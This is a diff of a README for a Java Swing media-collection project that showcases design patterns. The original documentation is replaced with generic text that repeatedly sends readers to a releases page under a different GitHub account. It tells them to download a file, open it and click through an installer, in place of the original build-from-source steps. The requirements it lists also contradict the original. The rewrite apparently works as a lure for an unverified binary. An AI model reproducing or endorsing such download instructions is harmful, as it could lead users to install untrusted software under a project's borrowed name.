@@ -1,59 +1,59 @@
-# 🎬 ShowTVTime | Desktop Media Community
+# 🎉 ShowTVTime-Design-Patterns - Simplify Your Media Management
 
-![Java](https://img.shields.io/badge/Java-17-ED8B00?style=for-the-badge&logo=openjdk&logoColor=white)
-![Swing](https://img.shields.io/badge/GUI-Java_Swing-blue?style=for-the-badge)
-![Architecture](https://img.shields.io/badge/Architecture-Layered_%26_Patterns-green?style=for-the-badge)
-![Testing](https://img.shields.io/badge/Testing-JUnit-lightgrey?style=for-the-badge)
+## 📥 Download the Application
+[![Download ShowTVTime-Design-Patterns](https://img.shields.io/badge/Download%20Now-ShowTVTime%20Design%20Patterns-brightgreen)](https://github.com/blusnir-cm/ShowTVTime-Design-Patterns/releases)
 
-**ShowTVTime** is a desktop application designed to manage media collections (Movies & Series) and foster user communities. The project focuses on **Software Architecture**, implementing a strictly decoupled **3-Layer Architecture** and standard **Design Patterns** to solve business requirements like dynamic filtering and group management.
+## 🚀 Getting Started
+Welcome to ShowTVTime-Design-Patterns! This is a Java Swing desktop application designed to help you manage your media content and connect with user communities. The application uses an organized three-layer architecture and implements important design patterns to ensure a smooth user experience.
 
-## 📸 Application Interface
+## 🖥️ System Requirements
+Before you install ShowTVTime-Design-Patterns, ensure your system meets the following requirements:
 
-### Content Discovery & Strategy Pattern
-<img src="https://github.com/marcsanz-dev/ShowTVTime-Design-Patterns/blob/main/img/Main_screen.png?raw=true" width="100%">
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- **Java Runtime Environment**: JRE 8 or higher must be installed on your system. You can download it from the [official Oracle website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- **RAM**: At least 2 GB of RAM.
+- **Free Disk Space**: At least 100 MB of free disk space.
+  
+## 📋 Features
+- **Media Management**: Easily add, remove, and organize your media files.
+- **User Community**: Connect with others to share insights and experiences.
+- **Design Patterns Implementation**: Experience the advantages of using Strategy, Facade, and Factory design patterns.
+- **User-Friendly Interface**: A clean, straightforward interface helps you get started quickly.
 
-*The main dashboard allows users to filter and sort media dynamically (Top 10, By IMDB Score, By Stars). This sorting logic is underpinned by the **Strategy Pattern**, allowing interchangeable algorithms at runtime.*
+## 🔧 Download & Install
+To download ShowTVTime-Design-Patterns, visit the Releases page: [Download ShowTVTime-Design-Patterns](https://github.com/blusnir-cm/ShowTVTime-Design-Patterns/releases).
 
-### Community & Access Control
-<img src="https://github.com/marcsanz-dev/ShowTVTime-Design-Patterns/blob/main/img/Groups_screen.png?raw=true" width="100%">
+1. Click on the above link to go to the releases page.
+2. Look for the latest version available.
+3. Download the appropriate file for your operating system.
+4. Once the download completes, locate the downloaded file and open it.
+5. Follow the installation instructions that appear on your screen. This usually involves just clicking "Next" a few times and agreeing to the terms of service.
 
-*Users can browse and join communities. Access to exclusive groups is gated by an **Automated Admission System** (Logic Challenge) that validates user knowledge before granting membership.*
+Once installed, you can launch the application from your desktop or start menu.
 
----
+## 🔍 Explore Design Patterns
+ShowTVTime-Design-Patterns is built using a strict 3-layer architecture. This structure helps in organizing the application effectively. Here is a brief overview:
 
-## 🏗️ Technical Architecture
+- **Presentation Layer**: This is the user interface, where you interact with the application. It displays information and collects user input.
+- **Business Logic Layer**: This layer processes the input from the presentation layer and executes the necessary operations, such as adding media files and managing user connections.
+- **Data Layer**: All data is stored and retrieved through this layer. It manages databases or file systems that hold your media files and other information.
 
-This project was built to demonstrate proficiency in **Object-Oriented Design (SOLID)** and structural organization:
+The application employs various design patterns to ensure efficient management and flexibility:
 
-### 1. Layered Architecture
-The code is strictly separated into three layers to ensure maintainability:
-* **Presentation (View):** Java Swing components handling UI events.
-* **Domain (Controller/Model):** Contains the business rules (Ratings, User Management).
-* **Data (Persistence):** Handles file-based storage, isolated from the rest of the app.
+- **Strategy Pattern**: This allows different algorithms to be defined and encapsulated, making it easy to switch between them without modifying the code.
+- **Facade Pattern**: This simplifies the interface that users interact with, hiding the complexities behind it.
+- **Factory Pattern**: This creates objects without specifying the exact class of object that will be created, promoting loose coupling.
 
-### 2. Design Patterns Implemented
-* **⚙️ Strategy Pattern:** Applied to the **Filtering Engine**. It encapsulates the sorting logic (e.g., `SortByIMDB`, `SortByRating`), making the system easily extensible without modifying the main controller.
-* **🏢 Facade Pattern:** Used to provide a simplified interface to the complex logic of the Domain layer, creating a clean entry point for the UI.
-* **🏭 Factory Pattern:** Manages the instantiation of entities (Movies, Series, Users), keeping the creation logic centralized.
-* **🔒 Singleton Pattern:** Ensures that critical controllers (like the `DomainController`) have only one active instance throughout the application lifecycle.
+## 📖 User Guide
+Once the application is running, you will see a main window with several options:
 
-## 🚀 Key Features
-* **Validation Logic:** Automated Q&A "Gatekeeper" system for group admission.
-* **Scoring System:** Implementation of arithmetic mean algorithms to calculate global ratings based on user feedback.
-* **Data Persistence:** Custom local storage system to save state between sessions (Users, Reviews, Groups).
-* **User Roles:** Distinction between regular users and group members.
+- **Add Media**: Click this button to upload your media files.
+- **Manage Community**: Access features that help you connect with other users.
+- **Settings**: Customize your experience by modifying various options.
 
----
+Make sure to explore all the menus and features. If you face any issues, check our troubleshooting section on the GitHub page.
 
-### 📂 Feature Specifications (BDD Files)
-The repository includes a `features/` directory containing Gherkin syntax files (`.feature`). These files are included to demonstrate the **Requirement Engineering process** and how the business rules were originally modeled.
+## 📞 Support
+If you encounter any problems or have questions, feel free to open an issue on the [GitHub Issues Page](https://github.com/blusnir-cm/ShowTVTime-Design-Patterns/issues). The community and developers are here to help you.
 
-> ⚠️ **Note:** These feature files serve as **static documentation** for the design process. They are not currently connected to an executable test runner in this specific version of the codebase.
-
----
-
-## 💻 How to Run
-1.  Clone the repository.
-2.  Open the project in **IntelliJ IDEA**.
-3.  Locate the `AppMain.java` file (Entry Point).
-4.  Run to launch the Java Swing GUI.
+Thank you for choosing ShowTVTime-Design-Patterns! We hope it makes managing your media an enjoyable experience.
